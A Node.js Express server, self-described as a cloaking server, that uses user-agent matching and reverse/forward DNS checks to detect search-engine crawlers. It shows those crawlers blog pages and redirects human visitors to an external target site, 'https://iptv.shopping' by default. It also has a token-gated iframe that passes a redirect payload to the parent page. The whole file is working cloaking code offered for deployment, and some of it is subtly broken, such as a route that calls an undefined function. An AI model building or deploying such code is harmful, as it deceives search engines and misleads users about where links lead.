// --- Dependencies ---
const express = require('express');
const cryptoModule = require('crypto'); // Renamed to avoid conflict with global crypto
const helmet = require('helmet'); // Recommended: Pin to v6+, e.g., "helmet": "^6.0.0" in package.json
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises; // Use fs.promises directly
const base64url = require('base64url'); // URL-safe base64
const serverless = require('serverless-http');
// const UAParser = require('ua-parser-js'); // Unused: UAParser
const dns = require('dns').promises;
const { RateLimiterMemory } = require('rate-limiter-flexible');

const next = require('next'); // Added for Next.js integration

// --- Next.js App Configuration ---
const dev = process.env.NODE_ENV !== 'production';
// IMPORTANT: Adjust './vercel-blog' if your Next.js app is in a different subdirectory relative to server.js
// If server.js is INSIDE the Next.js app's root, dir should be '.' or omitted.
const nextAppDir = './vercel-blog'; 
const appNext = next({ dev, dir: nextAppDir });
const handleNext = appNext.getRequestHandler();

// --- SECTION: CONFIGURATION & CONSTANTS ---
const TARGET_USER_REDIRECT_URL = process.env.TARGET_URL || 'https://iptv.shopping'; // Replace with your actual target URL
const BOT_CONTENT_DIR_NAME = 'bot_content_for_demo';
const TEMPLATES_DIR_NAME = 'templates_for_demo';
const DATA_DIR_NAME = 'data_for_demo';

const IS_PRODUCTION_LIKE = process.env.NODE_ENV === 'production';
const DEBUG_MODE = process.env.DEBUG_MODE === 'true' || !IS_PRODUCTION_LIKE;
const JSON_LOGS = process.env.JSON_LOGS === 'true';

// JWT Configuration for One-Time Keys
const JWT_SECRET_ENV = process.env.JWT_SECRET;
const JWT_SECRET = (JWT_SECRET_ENV && JWT_SECRET_ENV.length >= 32) ? JWT_SECRET_ENV : cryptoModule.randomBytes(32).toString('hex');
if (!JWT_SECRET_ENV || JWT_SECRET_ENV.length < 32) {
  if (IS_PRODUCTION_LIKE) {
    console.warn("[CRITICAL WARNING] JWT_SECRET is not set or is too short in a production-like environment. Using a temporary random secret. THIS IS INSECURE. Set a strong JWT_SECRET environment variable.");
  } else {
    console.warn("[Security Note] JWT_SECRET not set or too short. Using a temporary random secret for this session.");
  }
}
const JWT_ISSUER = 'CloakingDemoServer';
const JWT_AUDIENCE = 'CloakingDemoClient';
const JWT_KEY_EXPIRY_SECONDS = 5 * 60; // 5 minutes

const app = express();
app.set('trust proxy', 1);

// --- SECTION: LOGGING UTILITY ---
const logger = {
  _log: (level, ...args) => {
    const timestamp = new Date().toISOString();
    if (JSON_LOGS) {
      const logEntry = { timestamp, level, message: args[0], details: args.slice(1) };
      if (args[0] instanceof Error) {
        logEntry.message = args[0].message;
        logEntry.stack = args[0].stack;
        logEntry.details = args.slice(1);
      }
      console.log(JSON.stringify(logEntry));
    } else {
      const levelStr = `[${level.toUpperCase()}]`.padEnd(7);
      if (args[0] instanceof Error) {
        console.error(`${levelStr} ${timestamp.substring(11, 23)}`, args[0], ...args.slice(1));
      } else {
        console.log(`${levelStr} ${timestamp.substring(11, 23)}`, ...args);
      }
    }
  },
  debug: (...args) => { if (DEBUG_MODE) logger._log('debug', ...args); },
  info: (...args) => logger._log('info', ...args),
  warn: (...args) => logger._log('warn', ...args),
  error: (...args) => logger._log('error', ...args),
};

// --- SECTION: DEMO CONTENT SETUP ---
async function setupDemoContent() {
  const fsSync = require('fs'); // Use fsSync for setup to avoid issues with top-level await in older Node.js for serverless export
  try {
    const dirs = [BOT_CONTENT_DIR_NAME, TEMPLATES_DIR_NAME, DATA_DIR_NAME, path.join(BOT_CONTENT_DIR_NAME, 'blog')];
    for (const dir of dirs) {
      if (!fsSync.existsSync(dir)) fsSync.mkdirSync(dir, { recursive: true });
    }

    const filesToCreate = {
      [path.join(BOT_CONTENT_DIR_NAME, 'index.html')]: '<!DOCTYPE html><html><head><title>Bot Home</title></head><body><h1>Welcome Bot!</h1><p>This is the main page for bots.</p><a href="/blog">View Our Blog</a></body></html>',
      [path.join(TEMPLATES_DIR_NAME, 'blog-home.html')]: `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>{{title}} - Demo Blog</title><meta name="description" content="{{description}}"></head>
       <body><h1>{{title}}</h1><p><em>Serving content from: {{url}}</em></p><hr>
       {{#posts}}<article><h2><a href="/blog/{{slug}}">{{title}}</a></h2><p>{{excerpt}}</p><small>Published on: {{formattedDate}}</small><br/>{{#tags}}<span>[{{this}}] </span>{{/tags}}</article><hr>{{/posts}}
       {{^posts}}<p>No posts found.</p>{{/posts}}</body></html>`,
      [path.join(TEMPLATES_DIR_NAME, 'blog-template.html')]: `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>{{title}} - Demo Post</title><meta name="description" content="{{description}}"><meta name="keywords" content="{{keywords}}"></head>
       <body><header><h1>{{title}}</h1><p><small>Published: {{formattedDate}} | URL: {{url}}</small></p></header><main>{{{content}}}</main>
       <footer><p>Tags: {{#tags}}<span>[{{this}}] </span>{{/tags}}</p><a href="/blog">Back to Blog</a></footer></body></html>`,
    };
    
    // Skip overwriting posts.json if it already exists - keep user customized content
    const postsJsonPath = path.join(DATA_DIR_NAME, 'posts.json');
    if (!fsSync.existsSync(postsJsonPath)) {
      filesToCreate[postsJsonPath] = JSON.stringify({
        posts: [
          { id: "1", slug: "my-first-post", title: "My First Demo Post", excerpt: "This is a short summary of the first post, useful for listings.", content: "<p>This is the <strong>full HTML content</strong> of the <em>first</em> demonstration post. It can include various elements like lists:</p><ul><li>Point one</li><li>Point two</li></ul>", date: new Date(Date.now() - 86400000 * 2).toISOString(), published: true, tags: ["demo", "introduction", "example"], seo: { metaDescription: "An amazing first post for demonstration purposes.", keywords: "demo, first, example, nodejs" } },
          { id: "2", slug: "another-exciting-topic", title: "Another Exciting Topic Revealed", excerpt: "Exploring another interesting topic with some key takeaways.", content: "<p>Delving deeper into more content. This post discusses <code>code snippets</code> and perhaps even <pre>multi-line code blocks</pre>.</p><blockquote>A blockquote for emphasis.</blockquote>", date: new Date().toISOString(), published: true, tags: ["demo", "updates", "tech"], seo: { metaDescription: "A fascinating look into another topic, showcasing different content types.", keywords: "demo, updates, fascinating, technology" } }
        ],
        categories: [{ name: "General Info", slug: "general" }, { name: "Tech Updates", slug: "tech" }],
        tagsList: ["demo", "introduction", "example", "updates", "tech", "nodejs"]
      }, null, 2);
    }

    for (const [filePath, content] of Object.entries(filesToCreate)) {
      if (!fsSync.existsSync(filePath)) await fs.writeFile(filePath, content);
    }
    logger.info("Demo content setup complete.");
  } catch (error) {
    logger.error("Error during demo content setup:", error);
  }
}

// --- SECTION: RATE LIMITING ---
const mainRateLimiter = new RateLimiterMemory({
  points: IS_PRODUCTION_LIKE ? 20 : 100, duration: 1, blockDuration: IS_PRODUCTION_LIKE ? 60 : 10,
});
const keyGenRateLimiter = new RateLimiterMemory({
  points: IS_PRODUCTION_LIKE ? 5 : 25, duration: 60, blockDuration: IS_PRODUCTION_LIKE ? 300 : 60,
});

// --- SECTION: CORE MIDDLEWARE ---
app.use((req, res, next) => { // Earliest request ping
  logger.info(`[EarliestPing] Path: ${req.path}, IP: ${req.ip}`);
  next();
});

app.use(async (req, res, next) => {
  try {
    await mainRateLimiter.consume(req.ip);
    next();
  } catch (_rlRejected) {
    logger.warn(`[RateLimit] Main RL triggered`, { ip: req.ip, path: req.path });
    res.status(429).type('text').send('Too Many Requests');
  }
});

app.use((req, res, next) => {
  logger.debug(`${req.method} ${req.path}`, { ip: req.ip, ua: req.headers['user-agent'] ? req.headers['user-agent'].substring(0, 70) : 'N/A' });
  next();
});

app.use((req, res, next) => {
  res.locals.nonce = cryptoModule.randomBytes(18).toString('base64');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      ...(helmet.contentSecurityPolicy.getDefaultDirectives && helmet.contentSecurityPolicy.getDefaultDirectives()),
      'default-src': ["'self'"],
      'script-src': ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      'style-src': ["'self'", "'unsafe-inline'"], // Loader uses inline styles for simplicity
      'img-src': ["'self'", "data:", "blob:"],
      'frame-ancestors': ["'none'"],
    },
  },
}));
app.use(cors({ origin: false }));

// --- SECTION: JWT KEY SERVICE ---
class JwtKeyService {
  constructor(secret, issuer, audience, expiresInSeconds) {
    this.secret = secret; // Already validated for length or randomized
    this.issuer = issuer;
    this.audience = audience;
    this.expiresInSeconds = expiresInSeconds;
  }
  _sign(payload) {
    const header = { alg: 'HS256', typ: 'JWT' };
    const encodedHeader = base64url.encode(JSON.stringify(header));
    const encodedPayload = base64url.encode(JSON.stringify(payload));
    const signatureInput = `${encodedHeader}.${encodedPayload}`;
    const signature = cryptoModule.createHmac('sha256', this.secret).update(signatureInput).digest('base64url');
    return `${signatureInput}.${signature}`;
  }
  _verify(token) {
    const parts = token.split('.');
    if (parts.length !== 3) throw new Error('Token structure invalid');
    const [encodedHeader, encodedPayload, signature] = parts;
    const signatureInput = `${encodedHeader}.${encodedPayload}`;
    const expectedSignature = cryptoModule.createHmac('sha256', this.secret).update(signatureInput).digest('base64url');
    if (signature !== expectedSignature) throw new Error('Token signature invalid');
    const payload = JSON.parse(base64url.decode(encodedPayload));
    if (payload.iss !== this.issuer) throw new Error('Token issuer invalid');
    if (payload.aud !== this.audience) throw new Error('Token audience invalid');
    if (payload.exp * 1000 < Date.now()) throw new Error('Token expired');
    return payload;
  }
  generateOneTimeKeyToken(/*ip, userAgent*/) { // Commented out unused ip, userAgent
    const nowSeconds = Math.floor(Date.now() / 1000);
    const payload = {
      iss: this.issuer, aud: this.audience, iat: nowSeconds,
      exp: nowSeconds + this.expiresInSeconds, jti: cryptoModule.randomBytes(16).toString('hex'),
    };
    return this._sign(payload);
  }
  validateOneTimeKeyToken(token) {
    try {
      const payload = this._verify(token);
      return { valid: true, payload };
    } catch (error) {
      let code = 400;
      if (error.message.includes('expired')) code = 410;
      if (error.message.includes('signature') || error.message.includes('structure')) code = 401;
      return { valid: false, error: error.message, code };
    }
  }
}
const jwtKeyService = new JwtKeyService(JWT_SECRET, JWT_ISSUER, JWT_AUDIENCE, JWT_KEY_EXPIRY_SECONDS);

// --- SECTION: BOT VERIFICATION SERVICE ---
class BotVerifier {
  constructor() {
    this.crawlerConfig = {
      google: { domains: ['googlebot.com', 'google.com'], uaPattern: /googlebot|adsbot-google|apis-google|feedfetcher-google/i }, // e4 seems to be from a regex, likely a false positive or complex case. Review if error persists.
      bing: { domains: ['search.msn.com'], uaPattern: /bingbot|adidxbot/i },
      facebook: { domains: ['facebookbot.com', 'online-presence.facebook.com', 'tfbnw.net'], uaPattern: /facebookexternalhit|facebookcatalog|facebookbot|facebookscraper/i },
      apple: { domains: ['applebot.apple.com'], uaPattern: /applebot/i },
      yandex: { domains: ['yandex.com', 'yandex.ru'], uaPattern: /yandexbot|yandeximages/i}, // e6 seems to be from a regex, likely a false positive or complex case. Review if error persists.
      duckduckgo: { domains: ['duckduckbot.com'], uaPattern: /duckduckbot/i}
    };
    this.genericBotPattern = /bot|crawler|spider|cURL|wget|python|java|go-http-client|node-fetch|axios|headlesschrome|validator|checker|monitoring|slurp|feedfetcher|semrush|ahrefs|mj12|petalbot|linkdex|grapeshot|ia_archiver/i;
  }

  async _verifyDns(ip, domains) {
    if (!ip || !domains || domains.length === 0) return false;
    try {
      const reverseHostnames = await dns.reverse(ip);
      if (!reverseHostnames || reverseHostnames.length === 0) {
        logger.debug(`[DNSVerify] No rDNS found for IP: ${ip}`);
        return false;
      }
      const matchedReverseHostname = reverseHostnames.find(h =>
        domains.some(domain => h.toLowerCase().endsWith(`.${domain}`))
      );
      if (!matchedReverseHostname) {
        logger.debug(`[DNSVerify] rDNS hostnames [${reverseHostnames.join(', ')}] for IP ${ip} did not match expected domains [${domains.join(', ')}]`);
        return false;
      }
      let resolvedIPs = [];
      try { resolvedIPs = resolvedIPs.concat(await dns.resolve4(matchedReverseHostname)); } catch (_e4) { /* ignore */ }
      try { resolvedIPs = resolvedIPs.concat(await dns.resolve6(matchedReverseHostname)); } catch (_e6) { /* ignore */ }

      if (!resolvedIPs.includes(ip)) {
        logger.debug(`[DNSVerify] Forward DNS for ${matchedReverseHostname} ([${resolvedIPs.join(', ')}]) did not match original IP ${ip}`);
        return false;
      }
      return true;
    } catch (error) {
      // Log common DNS errors that aren't indicative of spoofing but rather lookup issues
      if (error.code === 'ENOTFOUND' || error.code === 'ENODATA' || error.code === 'ESERVFAIL' || error.code === 'ETIMEOUT') {
        logger.debug(`[DNSVerifyInternalError] DNS lookup issue for IP: ${ip}, Domains: ${domains.join(',')}, Error: ${error.code} - ${error.message}`);
      } else {
        logger.warn(`[DNSVerifyInternalError] Unexpected DNS error for IP: ${ip}`, error);
      }
      return false;
    }
  }

  async getBotType(req) {
    const userAgent = req.headers['user-agent'] || '';
    const ip = req.ip;

    for (const botKey in this.crawlerConfig) {
      const config = this.crawlerConfig[botKey];
      if (config.uaPattern.test(userAgent)) {
        logger.debug(`[BotDetect] UA matched ${botKey} for IP ${ip}. Verifying DNS...`);
        if (await this._verifyDns(ip, config.domains)) {
          logger.debug(`[BotDetect] DNS verified for ${botKey} from IP ${ip}.`);
          return `${botKey}_verified`;
        } else {
          logger.debug(`[BotDetect] DNS verification FAILED for ${botKey} from IP ${ip} (UA: ${userAgent}).`);
          return `${botKey}_unverified_ua`;
        }
      }
    }
    if (this.genericBotPattern.test(userAgent)) {
        logger.debug(`[BotDetect] Generic bot UA pattern matched for IP ${ip} (UA: ${userAgent}).`);
        return 'generic_bot_ua';
    }
    return null;
  }
}
const botVerifier = new BotVerifier();

// --- SECTION: TEMPLATE ENGINE & DATA LOADING ---
function getDescendantProp(obj, desc, defaultValue = '') {
    if (obj === undefined || obj === null) return defaultValue;
    if (!desc) return obj === undefined || obj === null ? defaultValue : obj; // Handle {{this}} or {{.}} for simple values
    const arr = desc.split('.');
    let current = obj;
    for (let i = 0; i < arr.length; i++) {
        if (current === null || typeof current !== 'object' || !Object.prototype.hasOwnProperty.call(current, arr[i])) {
            return defaultValue;
        }
        current = current[arr[i]];
    }
    return current === undefined || current === null ? defaultValue : current;
}

function escapeHtml(unsafe) {
  if (unsafe === undefined || unsafe === null) return '';
  return String(unsafe)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function safeTemplateEngine(templateStr, data) {
    if (typeof templateStr !== 'string') return '';
    let result = templateStr;

    // Use a corrected regex that avoids path-to-regexp errors
    result = result.replace(/{{([?^#])\s*([\w.-]+)\s*}}([\s\S]*?){{\/\2\s*}}/g, (match, type, key, content) => {
        const value = getDescendantProp(data, key);
        if (type === '?') return value ? processBlock(content, data) : ''; 
        if (type === '^') return !value ? processBlock(content, data) : '';
        if (type === '#') { 
            if (!Array.isArray(value) || value.length === 0) return '';
            return value.map(item => processBlock(content, { ...data, ...item, this: item, '.': item })).join('');
        }
        return '';
    });
    function processBlock(blockContent, blockData) { // Helper to recursively process blocks
        return blockContent
            .replace(/{{{([\w.-]+)}}}/g, (m, k) => getDescendantProp(blockData, k, ''))
            .replace(/{{\s*([\w.-]+)\s*}}/g, (m, k) => escapeHtml(getDescendantProp(blockData, k, '')));
    }
    result = processBlock(result, data); // Process top-level variables
    return result;
}

function formatDate(dateString) {
  if (!dateString) return 'Unknown date';
  try {
    const date = new Date(dateString);
    if (isNaN(date.getTime())) return 'Invalid date';
    return date.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
  } catch (_e_formatDate) { return 'Invalid date'; } // Renamed 'e' to avoid conflict if it's truly unused elsewhere, or log e_formatDate
}

async function loadBlogData() {
  try {
    const dataPath = path.join(__dirname, DATA_DIR_NAME, 'posts.json');
    const jsonData = await fs.readFile(dataPath, 'utf8');
    const blogJson = JSON.parse(jsonData);
    return {
      posts: (blogJson.posts || [])
        .filter(p => p.published)
        .map(p => ({ ...p, formattedDate: formatDate(p.date) }))
        .sort((a, b) => new Date(b.date) - new Date(a.date)),
      categories: blogJson.categories || [],
      tagsList: blogJson.tagsList || [], // Ensure this matches the key in posts.json
    };
  } catch (error) {
    logger.error('Error loading blog data:', error);
    return { posts: [], categories: [], tagsList: [] };
  }
}

async function loadBlogPost(slug) {
  const { posts } = await loadBlogData();
  return posts.find(p => p.slug === slug) || null;
}

// --- SECTION: ANTI-FINGERPRINTING (Illustrative) ---
/* // Unused: addRandomHtmlElements
function addRandomHtmlElements(body) {
  if (Math.random() < 0.75) { // Higher chance
    const randomComment = `<!-- DynamicMarker: ${cryptoModule.randomBytes(6).toString('hex')} TS: ${Date.now()} Variant: ${Math.random().toString(16).slice(2,10)} -->`;
    const insertPoint = body.lastIndexOf('</body>');
    if (insertPoint !== -1) {
      body = body.slice(0, insertPoint) + randomComment + "\n" + body.slice(insertPoint);
    }
  }
  return body;
} 
*/

// --- SECTION: CORE CLOAKING AND NEXT.JS ROUTING MIDDLEWARE ---
app.use(async (req, res, nextMiddleware) => {
  logger.info(`[CoreCloakEntry] Path: ${req.path}, IP: ${req.ip}`);
  // Exclude specific utility paths from cloaking/redirection
  if (req.path.startsWith('/_next/') || req.path.startsWith('/__nextjs') || req.path === '/favicon.ico' || req.path.startsWith('/next-assets/')) { // Added /next-assets/ for any other static asset convention
    return handleNext(req, res);
  }

  // The /key endpoint has its own route definition and should not be cloaked/redirected by this general middleware.
  if (req.path === '/key') {
    return nextMiddleware(); // Pass to the specific /key route handler
  }

  let botType;
  try {
    botType = await botVerifier.getBotType(req);
  } catch (err) {
    logger.error('Error in botVerifier.getBotType:', err);
    botType = null; // Treat as human on error to be safe
  }

  if (botType) {
    logger.info(`[Cloak] Bot detected: ${botType.type} (${botType.ua || 'N/A'}). Serving Next.js content for ${req.path}`);
    // Handle requests for the homepage or blog index for bots
    if (req.path === '/' || req.path === '/blog' || req.path.startsWith('/blog/index.html')) {
      return appNext.render(req, res, '/', req.query); // Render Next.js homepage (assuming it's at / in the Next app)
    } else if (req.path.startsWith('/blog/')) {
      // Match /blog/some-slug or /blog/some-slug?query=abc
      const slugMatch = req.path.match(/^\/blog\/([^\/?#]+)/);
      if (slugMatch && slugMatch[1]) {
        const slug = slugMatch[1];
        // Assuming your Next.js blog posts are under /post/[slug] page structure
        return appNext.render(req, res, `/post/${slug}`, req.query);
      } else {
        // If it's /blog/ but not a valid slug pattern (e.g. /blog/ or /blog/?query=...), serve homepage or a blog index from Next
        return appNext.render(req, res, '/', req.query); // Or a specific /blog page if you have one in Next.js
      }
    } else {
      // For any other paths requested by bots (e.g. other Next.js pages not explicitly handled above, or direct asset paths)
      return handleNext(req, res);
    }
  } else {
    // Not a bot, or bot detection failed: redirect to target URL
    logger.info(`[Cloak] Human user or unverified bot detected. Redirecting to: ${TARGET_USER_REDIRECT_URL} for path ${req.path}`);
    return res.redirect(302, TARGET_USER_REDIRECT_URL);
  }
});

// --- SECTION: ENDPOINTS ---
app.get('/key', async (req, res) => {
  try {
    await keyGenRateLimiter.consume(req.ip);
    const oneTimeToken = jwtKeyService.generateOneTimeKeyToken(req.ip, req.headers['user-agent']);
    res.json({ keyToken: oneTimeToken });
  } catch (error) {
    if (error.name === 'RateLimiterError') {
      logger.warn(`[RateLimit] KeyGen RL triggered`, { ip: req.ip });
      res.status(429).json({ error: 'Too many key requests' });
    } else {
      logger.error('[KeyEndpointError]', error);
      res.status(500).json({ error: 'Key generation failed' });
    }
  }
});

app.get('/content/:keyToken', (req, res, next) => {
  // Set a route-specific CSP header with the correct nonce for inline script
  // And allow being framed by the parent (same origin)
  const nonce = res.locals.nonce;
  res.setHeader('Content-Security-Policy', `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; frame-ancestors 'self'`);
  next();
}, async (req, res) => {
  const { keyToken } = req.params;
  if (!keyToken || typeof keyToken !== 'string' || keyToken.length < 10) {
    return res.status(400).json({ error: 'Invalid key token format' });
  }
  const tokenStatus = jwtKeyService.validateOneTimeKeyToken(keyToken);

  if (!tokenStatus.valid) {
    logger.debug(`[ContentInvalidKeyToken] Error: ${tokenStatus.error}`, { keyTokenAttempt: keyToken.substring(0,20)+'...', ip: req.ip });
    return res.status(tokenStatus.code || 400).json({ error: `Key token validation failed: ${tokenStatus.error}` });
  }

  const realContentPayload = { type: 'redirect', url: TARGET_USER_REDIRECT_URL };
  const htmlResponse = `<!DOCTYPE html><html><head><title>Finalizing</title><meta name="robots" content="noindex,nofollow"></head><body><script nonce="${res.locals.nonce}">try{if(window.parent&&window.parent.postMessage){window.parent.postMessage(JSON.stringify(${JSON.stringify(realContentPayload)}),window.location.origin);}}catch(e){console.error("iframe postMessage failed",e)}</script></body></html>`;
  logger.debug(`[ContentServed] Valid key token used. Redirect payload sent.`, { jti: tokenStatus.payload.jti, ip: req.ip });
  res.type('html').send(htmlResponse);
});

// --- SECTION: FRONTEND STATIC & SSR ROUTES ---
const FRONTEND_DIR = path.join(__dirname, 'public');
const VIEWS_DIR = path.join(__dirname, 'views');

app.use('/assets', express.static(path.join(FRONTEND_DIR, 'assets')));

// SSR for homepage, blog, post, etc. (user flow)
app.get(['/home', '/blog', '/blog/page/:page', '/blog/category/:category', '/blog/tag/:tag', '/blog/search', '/dev-view-blog'], async (req, res /*, next*/) => { // next is unused
  // Allow direct blog view in dev mode and for /dev-view-blog path
  const isDev = req.path === '/dev-view-blog';
  let botType;
  
  // Skip bot verification for dev path
  if (!isDev) {
    try { botType = await botVerifier.getBotType(req); } catch { botType = null; }
    if (botType) return next(); // Let bot flow handle
  }

  // Load posts, categories, tags
  const { posts, categories, tagsList } = await loadBlogData();
  // Pagination, filtering, search logic here (to be implemented)
  const page = parseInt(req.params.page || '1', 10);
  const perPage = 6;
  const paginatedPosts = posts.slice((page-1)*perPage, page*perPage);
  const template = await fs.readFile(path.join(VIEWS_DIR, 'blog-home.html'), 'utf8');
  const html = safeTemplateEngine(template, {
    title: 'Premium Blog',
    description: 'A beautiful, modern blog for real users.',
    url: req.originalUrl,
    posts: paginatedPosts,
    categories,
    tags: tagsList,
    page,
    totalPages: Math.ceil(posts.length/perPage),
    year: new Date().getFullYear() // Add year for footer copyright
  });
  res.type('html').send(html);
});

app.get('/blog/:slug', async (req, res, next) => {
  let botType;
  try { botType = await botVerifier.getBotType(req); } catch { botType = null; }
  if (botType) return next();
  const post = await loadBlogPost(req.params.slug);
  if (!post) return res.status(404).sendFile(path.join(VIEWS_DIR, '404.html'));
  const template = await fs.readFile(path.join(VIEWS_DIR, 'blog-post.html'), 'utf8');
  const html = safeTemplateEngine(template, {
    ...post,
    url: req.originalUrl,
    categories: post.categories || [],
    tags: post.tags || [],
  });
  res.type('html').send(html);
});

// --- Root route: real users redirected to external site, bots get blog content ---
app.get('/', async (req, res /*, next*/) => {
  let botType;
  try { botType = await botVerifier.getBotType(req); } catch { botType = null; }
  if (botType) {
    // Serve blog homepage for bots
    const { posts, categories, tagsList } = await loadBlogData();
    const page = 1;
    const perPage = 6;
    const paginatedPosts = posts.slice(0, perPage);
    const template = await fs.readFile(path.join(VIEWS_DIR, 'blog-home.html'), 'utf8');
    const html = safeTemplateEngine(template, {
      title: 'Premium Blog',
      description: 'A beautiful, modern blog for bots.',
      url: req.originalUrl,
      posts: paginatedPosts,
      categories,
      tags: tagsList,
      page,
      totalPages: Math.ceil(posts.length/perPage)
    });
    return res.type('html').send(html);
  } else {
    // Not a bot, redirect to target URL
    logger.info(`[RootRoute] Human user or unverified bot. Redirecting to: ${TARGET_USER_REDIRECT_URL}`);
    return res.redirect(302, TARGET_USER_REDIRECT_URL);
  }
  // Real users redirected to external site (handled by the else block above)
});

// --- SECTION: SERVER START & EXPORT ---
let serverlessHandler;

async function initializeApp() {
  await appNext.prepare();
  logger.info('Next.js app prepared successfully.');
  await setupDemoContent(); // Setup demo content after Next.js is ready
  serverlessHandler = serverless(app); // Initialize serverless handler AFTER app is fully configured
}

// Initialize the app immediately
const appInitializationPromise = initializeApp();

// For local development (Vercel CLI `vercel dev` or `node server.js`)
if (!process.env.VERCEL) { // Check if NOT running in Vercel production
  appInitializationPromise.then(() => {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
      logger.info(`"Near Production-Grade" Demo Cloaking Server running on http://localhost:${PORT}`);
      logger.info(`Production-like mode: ${IS_PRODUCTION_LIKE}, Debug mode: ${DEBUG_MODE}, JSON Logs: ${JSON_LOGS}`);
      logger.info(`JWT Secret: ${DEBUG_MODE || !IS_PRODUCTION_LIKE ? JWT_SECRET.substring(0,8)+'...' : 'Loaded (hidden in prod log)'}`);
      logger.info(`Target redirect for users: ${TARGET_USER_REDIRECT_URL}`);
      console.log("\n--- How to Test ---");
      console.log("1. User Flow: Open http://localhost:3000 in your browser.");
      console.log("2. Verified Googlebot (simulated): curl -A \"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/W.X.Y.Z Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\" http://localhost:3000/");
      console.log("   (For true verification, server needs public IP Google can rDNS, or use local DNS overrides for localhost)");
      console.log("3. Verified Bingbot (simulated): curl -A \"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)\" http://localhost:3000/");
      console.log("4. Unverified Googlebot UA (should get user flow if IP doesn't rDNS to Google): curl -A \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\" -H \"X-Forwarded-For: 1.2.3.4\" http://localhost:3000/");
      console.log("--- Set DEBUG_MODE=true and/or JSON_LOGS=true env vars for more verbose/structured logs. ---\n");
    });
  }).catch(ex => {
    logger.error('Error during local server startup:', ex.stack);
    process.exit(1);
  });
}

// Serverless export for Vercel
module.exports.handler = async (event, context) => {
  await appInitializationPromise; // Ensure app is initialized before handling requests
  if (!serverlessHandler) {
    // Fallback initialization if somehow the above didn't complete or wasn't awaited at the module level for all invocations
    // This can happen in some cold start scenarios or if the module is re-required without hitting the top-level appInitializationPromise fully.
    logger.warn('Re-running app initialization within handler. This should be rare.');
    await initializeApp(); 
  }
  return serverlessHandler(event, context);
};

// --- Serve Admin Dashboard and API ---
app.use('/admin', express.static(path.join(__dirname, 'admin')));

// --- Catch-all route for bots to serve blog posts and static bot content ---
app.use(async (req, res, next) => {
  let botType;
  try { botType = await botVerifier.getBotType(req); } catch { botType = null; }
  if (!botType) return next(); // Not a bot, continue to 404

  // Serve blog post for bots
  if (req.path.startsWith('/blog/')) {
    const slug = req.path.replace('/blog/', '').replace(/\/$/, '');
    const post = await loadBlogPost(slug);
    if (post) {
      const template = await fs.readFile(path.join(__dirname, TEMPLATES_DIR_NAME, 'blog-template.html'), 'utf8');
      const html = safeTemplateEngine(template, {
        ...post,
        url: req.originalUrl,
        categories: post.categories || [],
        tags: post.tags || [],
      });
      return res.type('html').send(html);
    } else {
      return res.status(404).send('404 - Blog Post Not Found (Bot View)');
    }
  }
  
  // Serve static bot content or 404
  const safeServePath = path.normalize(req.path).replace(/^(\.\.([/\\]|$))+/, '');
  let diskPath = path.join(__dirname, BOT_CONTENT_DIR_NAME, safeServePath);
  if (!diskPath.endsWith('.html')) diskPath += '.html';
  try {
    const htmlContent = await fs.readFile(diskPath, 'utf8');
    return res.type('html').send(htmlContent);
  } catch (_e_botView404) {
    // logger.error('Error serving static bot content:', _e_botView404); // Consider logging the error
    return res.status(404).send('404 - Not Found (Bot View)');
  }
});

// Add a final 404 handler for non-bot requests that weren't matched
app.use((req, res) => {
  res.status(404).sendFile(path.join(VIEWS_DIR, '404.html'));
});